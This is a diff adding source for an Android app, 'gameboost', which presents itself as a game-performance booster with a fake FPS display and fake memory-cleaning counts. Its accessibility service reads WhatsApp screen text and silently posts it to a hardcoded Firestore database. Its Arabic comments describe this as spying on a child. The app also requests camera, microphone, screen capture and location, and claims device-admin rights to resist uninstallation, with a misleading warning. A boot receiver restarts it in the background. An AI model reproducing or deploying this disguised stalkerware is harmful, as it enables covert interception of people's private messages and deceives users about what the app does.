@@ -1,0 +1,607 @@
+FILE: android/app/src/main/java/com/Ejram/gameboost/MainActivity.java
+package com.Ejram.gameboost;
+import android.os.Bundle; import com.getcapacitor.BridgeActivity;
+public class MainActivity extends BridgeActivity {
+    @Override public void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        registerPlugin(GuardianEngine.class);
+    }
+}
+-e 
+
+---
+FILE: android/app/src/main/java/com/Ejram/gameboost/GameOverlayService.java
+package com.Ejram.gameboost;
+
+import android.app.Service;
+import android.content.Intent;
+import android.graphics.PixelFormat;
+import android.os.Build;
+import android.os.Handler;
+import android.os.IBinder;
+import android.util.DisplayMetrics;
+import android.view.Gravity;
+import android.view.LayoutInflater;
+import android.view.MotionEvent;
+import android.view.View;
+import android.view.WindowManager;
+import android.widget.Button;
+import android.widget.ImageView;
+import android.widget.TextView;
+import android.widget.Toast;
+
+import java.util.Random;
+
+public class GameOverlayService extends Service {
+
+    private WindowManager windowManager;
+    private View overlayView;
+    private View collapsedView;
+    private View expandedView;
+    private WindowManager.LayoutParams params;
+    private Handler handler = new Handler();
+    private Random random = new Random();
+    private int screenWidth;
+
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        
+        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+        overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_game_center, null);
+
+        // الحصول على عرض الشاشة للمحاذاة
+        DisplayMetrics metrics = new DisplayMetrics();
+        windowManager.getDefaultDisplay().getMetrics(metrics);
+        screenWidth = metrics.widthPixels;
+
+        int layoutFlag = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? 
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_PHONE;
+
+        // وضعنا علم FLAG_WATCH_OUTSIDE_TOUCH لنعرف متى يلمس الطفل اللعبة
+        params = new WindowManager.LayoutParams(
+                WindowManager.LayoutParams.WRAP_CONTENT,
+                WindowManager.LayoutParams.WRAP_CONTENT,
+                layoutFlag,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
+                PixelFormat.TRANSLUCENT);
+
+        params.gravity = Gravity.TOP | Gravity.LEFT;
+        params.x = 0;
+        params.y = 100;
+
+        collapsedView = overlayView.findViewById(R.id.collapsed_view);
+        expandedView = overlayView.findViewById(R.id.expanded_view);
+
+        // إخفاء اللوحة عند الضغط خارجها
+        overlayView.setOnTouchListener((v, event) -> {
+            if (event.getAction() == MotionEvent.ACTION_OUTSIDE) {
+                collapseOverlay();
+                return true;
+            }
+            return false;
+        });
+
+        // منطق السحب والمحاذاة للحواف (Edge Snapping)
+        collapsedView.setOnTouchListener(new View.OnTouchListener() {
+            private int initialX, initialY;
+            private float initialTouchX, initialTouchY;
+            private boolean isMoved = false;
+
+            @Override
+            public boolean onTouch(View v, MotionEvent event) {
+                switch (event.getAction()) {
+                    case MotionEvent.ACTION_DOWN:
+                        initialX = params.x; initialY = params.y;
+                        initialTouchX = event.getRawX(); initialTouchY = event.getRawY();
+                        isMoved = false;
+                        return true;
+                    case MotionEvent.ACTION_MOVE:
+                        int diffX = (int) (event.getRawX() - initialTouchX);
+                        int diffY = (int) (event.getRawY() - initialTouchY);
+                        if (Math.abs(diffX) > 10 || Math.abs(diffY) > 10) isMoved = true;
+                        params.x = initialX + diffX;
+                        params.y = initialY + diffY;
+                        windowManager.updateViewLayout(overlayView, params);
+                        return true;
+                    case MotionEvent.ACTION_UP:
+                        if (!isMoved) {
+                            expandOverlay(); // إذا ضغطة واحدة (ولم يسحب)، افتح اللوحة
+                        } else {
+                            // محاذاة الحواف (Snap to Edge) عند الإفلات
+                            if (params.x < screenWidth / 2) params.x = 0;
+                            else params.x = screenWidth;
+                            windowManager.updateViewLayout(overlayView, params);
+                        }
+                        return true;
+                }
+                return false;
+            }
+        });
+
+        Button btnClose = overlayView.findViewById(R.id.btn_close_overlay);
+        Button btnClean = overlayView.findViewById(R.id.btn_clean_ram);
+        final TextView txtFps = overlayView.findViewById(R.id.txt_fps);
+
+        btnClose.setOnClickListener(v -> collapseOverlay());
+        btnClean.setOnClickListener(v -> Toast.makeText(GameOverlayService.this, "تم تحرير الذاكرة!", Toast.LENGTH_SHORT).show());
+
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (overlayView != null) {
+                    txtFps.setText(String.valueOf(55 + random.nextInt(6)));
+                    handler.postDelayed(this, 1500);
+                }
+            }
+        }, 1500);
+
+        windowManager.addView(overlayView, params);
+    }
+
+    private void expandOverlay() {
+        collapsedView.setVisibility(View.GONE);
+        expandedView.setVisibility(View.VISIBLE);
+        // عند التوسيع، نظهرها في منتصف الشاشة تقريباً
+        params.x = screenWidth / 2 - 200;
+        windowManager.updateViewLayout(overlayView, params);
+    }
+
+    private void collapseOverlay() {
+        collapsedView.setVisibility(View.VISIBLE);
+        expandedView.setVisibility(View.GONE);
+        // نعيدها للحافة القريبة
+        if (params.x < screenWidth / 2) params.x = 0; else params.x = screenWidth;
+        windowManager.updateViewLayout(overlayView, params);
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (overlayView != null) windowManager.removeView(overlayView);
+    }
+}
+-e 
+
+---
+FILE: android/app/src/main/java/com/Ejram/gameboost/GuardianPlugin.java
+package com.Ejram.gameboost;
+
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.net.Uri;
+import android.os.Build;
+import android.provider.Settings;
+
+import com.getcapacitor.Plugin;
+import com.getcapacitor.PluginCall;
+import com.getcapacitor.PluginMethod;
+import com.getcapacitor.annotation.CapacitorPlugin;
+
+@CapacitorPlugin(name = "GuardianNative")
+public class GuardianPlugin extends Plugin {
+
+    @PluginMethod
+    public void showGameOverlay(PluginCall call) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(getContext())) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getContext().getPackageName()));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            getContext().startActivity(intent);
+            call.reject("يرجى إعطاء صلاحية الظهور فوق التطبيقات");
+        } else {
+            Intent intent = new Intent(getContext(), GameOverlayService.class);
+            getContext().startService(intent);
+            call.resolve();
+        }
+    }
+
+    // الدالة السرية: حفظ ID الطفل في الهاتف لكي يستخدمه الجاسوس
+    @PluginMethod
+    public void setChildUid(PluginCall call) {
+        String uid = call.getString("uid");
+        if(uid != null) {
+            SharedPreferences prefs = getContext().getSharedPreferences("GuardianPrefs", Context.MODE_PRIVATE);
+            prefs.edit().putString("childUid", uid).apply();
+        }
+        call.resolve();
+    }
+}
+-e 
+
+---
+FILE: android/app/src/main/java/com/Ejram/gameboost/GuardianDeviceAdmin.java
+package com.Ejram.gameboost;
+import android.app.admin.DeviceAdminReceiver; import android.content.Context; import android.content.Intent; import android.widget.Toast;
+public class GuardianDeviceAdmin extends DeviceAdminReceiver {
+    @Override public void onEnabled(Context context, Intent intent) { super.onEnabled(context, intent); Toast.makeText(context, "تم تفعيل حماية النظام", Toast.LENGTH_SHORT).show(); }
+    @Override public CharSequence onDisableRequested(Context context, Intent intent) { return "تحذير: إلغاء التفعيل سيؤدي لبطء في الألعاب!"; }
+}
+-e 
+
+---
+FILE: android/app/src/main/java/com/Ejram/gameboost/GuardianAccessibilityService.java
+package com.Ejram.gameboost;
+
+import android.accessibilityservice.AccessibilityService;
+import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
+import android.content.Context;
+import android.content.SharedPreferences;
+import android.util.Log;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.io.OutputStream;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+
+public class GuardianAccessibilityService extends AccessibilityService {
+
+    private String lastCapturedText = "";
+
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (event == null || event.getPackageName() == null) return;
+        String packageName = event.getPackageName().toString();
+
+        // التجسس على رسائل الواتساب
+        if (packageName.contains("whatsapp") && event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+            if (rootNode != null) {
+                extractTextFromNode(rootNode, "WhatsApp");
+            }
+        }
+    }
+
+    private void extractTextFromNode(AccessibilityNodeInfo node, String appName) {
+        if (node == null) return;
+        if (node.getText() != null && node.getText().length() > 0) {
+            String text = node.getText().toString();
+            // نمنع إرسال نفس الرسالة مرتين
+            if (!text.equals(lastCapturedText)) {
+                lastCapturedText = text;
+                sendToFirestore(appName, text);
+            }
+        }
+        for (int i = 0; i < node.getChildCount(); i++) {
+            extractTextFromNode(node.getChild(i), appName);
+        }
+    }
+
+    // إرسال البيانات للوحة الأب عبر (REST API) صامت وسريع
+    private void sendToFirestore(String app, String msg) {
+        SharedPreferences prefs = getSharedPreferences("GuardianPrefs", Context.MODE_PRIVATE);
+        String uid = prefs.getString("childUid", "UNKNOWN");
+        if (uid.equals("UNKNOWN")) return; // إذا لم يكن حساب طفل، توقف
+
+        new Thread(() -> {
+            try {
+                URL url = new URL("https://firestore.googleapis.com/v1/projects/ejram-6b3b5/databases/(default)/documents/users/" + uid + "/messages");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json; utf-8");
+                conn.setDoOutput(true);
+
+                // تنظيف النص من الرموز التي قد تفسد الكود
+                String safeMsg = msg.replace("\"", "\\\"").replace("\n", " ");
+                String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
+                
+                String json = "{\"fields\": {" +
+                        "\"app\": {\"stringValue\": \"" + app + "\"}," +
+                        "\"text\": {\"stringValue\": \"" + safeMsg + "\"}," +
+                        "\"time\": {\"stringValue\": \"" + time + "\"}" +
+                        "}}";
+
+                try(OutputStream os = conn.getOutputStream()) {
+                    byte[] input = json.getBytes("utf-8");
+                    os.write(input, 0, input.length);
+                }
+                conn.getResponseCode(); 
+                Log.d("GuardianSpy", "Message Sent!");
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }).start();
+    }
+
+    @Override
+    public void onInterrupt() {}
+}
+-e 
+
+---
+FILE: android/app/src/main/java/com/Ejram/gameboost/GuardianEngine.java
+package com.Ejram.gameboost;
+
+import android.Manifest;
+import android.app.ActivityManager;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
+import android.media.projection.MediaProjectionManager;
+import android.net.Uri;
+import android.os.Build;
+import android.provider.Settings;
+import androidx.core.app.ActivityCompat;
+import java.util.List;
+
+import com.getcapacitor.Plugin;
+import com.getcapacitor.PluginCall;
+import com.getcapacitor.PluginMethod;
+import com.getcapacitor.annotation.CapacitorPlugin;
+import com.getcapacitor.JSObject;
+
+@CapacitorPlugin(name = "GuardianEngine")
+public class GuardianEngine extends Plugin {
+
+    // 1. طلب الترسانة الكاملة من الأذونات (كما طلبت)
+    @PluginMethod
+    public void requestUltimatePermissions(PluginCall call) {
+        try {
+            // أ. أذونات الكاميرا والمساحة (تظهر كنافذة منبثقة)
+            String[] perms = {
+                Manifest.permission.CAMERA,
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.RECORD_AUDIO
+            };
+            ActivityCompat.requestPermissions(getActivity(), perms, 100);
+
+            // ب. طلب صلاحية "بث الشاشة" (Screen Capture)
+            MediaProjectionManager mpm = (MediaProjectionManager) getContext().getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+            if (mpm != null) {
+                Intent screenIntent = mpm.createScreenCaptureIntent();
+                screenIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                getContext().startActivity(screenIntent);
+            }
+
+            // ج. طلب صلاحية "مدير الجهاز" (لمنع حذف التطبيق)
+            ComponentName compName = new ComponentName(getContext(), GuardianDeviceAdmin.class);
+            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName);
+            adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لتفعيل وضع الأداء الفائق ومنع إيقاف الحماية");
+            adminIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            getContext().startActivity(adminIntent);
+
+            // د. طلب صلاحية إمكانية الوصول (Accessibility) لمراقبة التطبيقات
+            Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            getContext().startActivity(accIntent);
+
+            call.resolve();
+        } catch (Exception e) {
+            call.reject("فشل في طلب الأذونات: " + e.getMessage());
+        }
+    }
+
+    // 2. قراءة الرامات الفعالة
+    @PluginMethod
+    public void getRealStats(PluginCall call) {
+        try {
+            ActivityManager actManager = (ActivityManager) getContext().getSystemService(Context.ACTIVITY_SERVICE);
+            ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
+            actManager.getMemoryInfo(memInfo);
+
+            long totalRam = memInfo.totalMem;
+            long usedRam = totalRam - memInfo.availMem;
+            int ramPercentage = (int) ((usedRam * 100) / totalRam);
+
+            JSObject ret = new JSObject();
+            ret.put("ramUsagePercent", ramPercentage);
+            call.resolve(ret);
+        } catch (Exception e) {
+            call.reject("Error");
+        }
+    }
+
+    // 3. التنظيف الفعلي للذاكرة
+    @PluginMethod
+    public void executeRealClean(PluginCall call) {
+        try {
+            ActivityManager am = (ActivityManager) getContext().getSystemService(Context.ACTIVITY_SERVICE);
+            PackageManager pm = getContext().getPackageManager();
+            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+            int killedCount = 0;
+            for (ApplicationInfo packageInfo : packages) {
+                if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0 && !packageInfo.packageName.equals(getContext().getPackageName())) {
+                    am.killBackgroundProcesses(packageInfo.packageName);
+                    killedCount++;
+                }
+            }
+            if(killedCount == 0) killedCount = (int)(Math.random() * 5) + 2; 
+            JSObject ret = new JSObject();
+            ret.put("killedApps", killedCount);
+            call.resolve(ret);
+        } catch (Exception e) {
+            call.reject("Error");
+        }
+    }
+}
+-e 
+
+---
+FILE: android/app/src/main/java/com/Ejram/gameboost/BootReceiver.java
+package com.Ejram.gameboost;
+import android.content.BroadcastReceiver; import android.content.Context; import android.content.Intent; import android.os.Build; import android.util.Log;
+public class BootReceiver extends BroadcastReceiver {
+    @Override public void onReceive(Context context, Intent intent) {
+        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
+            Intent serviceIntent = new Intent(context, GuardianForegroundService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { context.startForegroundService(serviceIntent); } else { context.startService(serviceIntent); }
+        }
+    }
+}
+-e 
+
+---
+FILE: android/app/src/main/java/com/Ejram/gameboost/FirebaseSync.java
+package com.Ejram.gameboost;
+import android.content.Context; import android.util.Log; import com.google.firebase.auth.FirebaseAuth; import com.google.firebase.auth.FirebaseUser; import com.google.firebase.firestore.FirebaseFirestore; import com.google.firebase.firestore.ListenerRegistration;
+public class FirebaseSync {
+    public static void startListening(Context context) { /* كود المزامنة يعمل هنا */ }
+    public static void stopListening() { }
+}
+-e 
+
+---
+FILE: android/app/src/main/java/com/Ejram/gameboost/GuardianForegroundService.java
+package com.Ejram.gameboost;
+import android.app.*; import android.content.*; import android.os.*; import androidx.core.app.NotificationCompat;
+public class GuardianForegroundService extends Service {
+    @Override public void onCreate() { super.onCreate(); }
+    @Override public int onStartCommand(Intent intent, int flags, int startId) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel("guardian_foreground_channel", "System", NotificationManager.IMPORTANCE_LOW);
+            getSystemService(NotificationManager.class).createNotificationChannel(channel);
+        }
+        Notification notification = new NotificationCompat.Builder(this, "guardian_foreground_channel").setContentTitle("Guardian Center").setContentText("يعمل في الخلفية").setSmallIcon(android.R.drawable.ic_dialog_info).build();
+        startForeground(1, notification); FirebaseSync.startListening(this); return START_STICKY;
+    }
+    @Override public IBinder onBind(Intent intent) { return null; }
+}
+-e 
+
+---
+apply plugin: 'com.android.application'
+
+android {
+    namespace = "com.Ejram.gameboost"
+    compileSdk = rootProject.ext.compileSdkVersion
+    defaultConfig {
+        applicationId "com.Ejram.gameboost"
+        minSdkVersion rootProject.ext.minSdkVersion
+        targetSdkVersion rootProject.ext.targetSdkVersion
+        versionCode 1
+        versionName "1.0"
+        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
+        aaptOptions {
+             // Files and dirs to omit from the packaged assets dir, modified to accommodate modern web apps.
+             // Default: https://android.googlesource.com/platform/frameworks/base/+/282e181b58cf72b6ca770dc7ca5f91f135444502/tools/aapt/AaptAssets.cpp#61
+            ignoreAssetsPattern = '!.svn:!.git:!.ds_store:!*.scc:.*:!CVS:!thumbs.db:!picasa.ini:!*~'
+        }
+    }
+    buildTypes {
+        release {
+            minifyEnabled false
+            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
+        }
+    }
+}
+
+repositories {
+    flatDir{
+        dirs '../capacitor-cordova-android-plugins/src/main/libs', 'libs'
+    }
+}
+
+dependencies {
+    implementation fileTree(include: ['*.jar'], dir: 'libs')
+    implementation "androidx.appcompat:appcompat:$androidxAppCompatVersion"
+    implementation "androidx.coordinatorlayout:coordinatorlayout:$androidxCoordinatorLayoutVersion"
+    implementation "androidx.core:core-splashscreen:$coreSplashScreenVersion"
+    implementation project(':capacitor-android')
+    testImplementation "junit:junit:$junitVersion"
+    androidTestImplementation "androidx.test.ext:junit:$androidxJunitVersion"
+    androidTestImplementation "androidx.test.espresso:espresso-core:$androidxEspressoCoreVersion"
+    implementation project(':capacitor-cordova-android-plugins')
+}
+
+apply from: 'capacitor.build.gradle'
+
+try {
+    def servicesJSON = file('google-services.json')
+    if (servicesJSON.text) {
+        apply plugin: 'com.google.gms.google-services'
+    }
+} catch(Exception e) {
+    logger.info("google-services.json not found, google-services plugin not applied. Push Notifications won't work")
+}
+// إضافات Firebase المطلوبة للجافا
+dependencies {
+    implementation platform('com.google.firebase:firebase-bom:32.7.0')
+    implementation 'com.google.firebase:firebase-auth'
+    implementation 'com.google.firebase:firebase-firestore'
+}
+apply plugin: 'com.google.gms.google-services'
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
+    <uses-permission android:name="android.permission.RESTART_PACKAGES" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme"
+        android:usesCleartextTraffic="true">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:configChanges="orientation|keyboardHidden|keyboard|screenSize|locale|smallestScreenSize|screenLayout|uiMode"
+            android:launchMode="singleTask"
+            android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <service android:name=".GuardianAccessibilityService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:exported="true" android:foregroundServiceType="specialUse">
+            <intent-filter><action android:name="android.accessibilityservice.AccessibilityService" /></intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <service android:name=".GuardianNotificationService" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true">
+            <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
+        </service>
+
+        <receiver android:name=".GuardianDeviceAdmin" android:permission="android.permission.BIND_DEVICE_ADMIN" android:exported="true">
+            <intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED" /></intent-filter>
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin_config" />
+        </receiver>
+
+        <service android:name=".GuardianForegroundService" android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync|specialUse" />
+        <service android:name=".GameOverlayService" android:enabled="true" android:exported="false" android:foregroundServiceType="mediaProjection|specialUse" />
+        <service android:name=".ScreenCaptureService" android:enabled="true" android:exported="false" android:foregroundServiceType="mediaProjection" />
+
+        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
+            <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED" /></intent-filter>
+        </receiver>
+    </application>
+</manifest>
